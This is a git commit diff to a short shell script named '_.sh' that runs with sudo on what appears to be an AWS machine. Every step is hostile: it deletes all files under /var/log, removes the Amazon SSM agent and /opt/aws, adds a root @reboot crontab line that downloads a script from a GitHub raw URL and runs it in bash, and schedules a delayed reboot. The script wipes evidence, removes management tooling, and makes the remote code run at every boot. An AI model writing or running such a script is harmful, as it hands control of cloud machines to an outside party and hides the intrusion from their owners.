425d5906ef488364c77fc819e061ea5839ce2495
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-01-08 09:03:07 +0800

    Update _.sh

--- _.sh
+++ _.sh
@@ -1,7 +1,8 @@
 #!/bin/sh
 
 sudo find /var/log -type f -delete
-# sudo rm -rf /usr/bin/amazon-ssm-agent /usr/bin/ssm-agent-worker /etc/opt/ml/scripts /opt/aws
-sudo rm -rf /etc/opt/ml/scripts /opt/aws
+sudo rm -rf /usr/bin/amazon-ssm-agent /usr/bin/ssm-agent-worker /etc/opt/ml/scripts /opt/aws
+# sudo rm -rf /etc/opt/ml/scripts /opt/aws
 sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/run.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
-sudo reboot
+# sudo reboot
+sudo /bin/sh -c "sleep 600 && sudo reboot" >/dev/null 2>&1 &
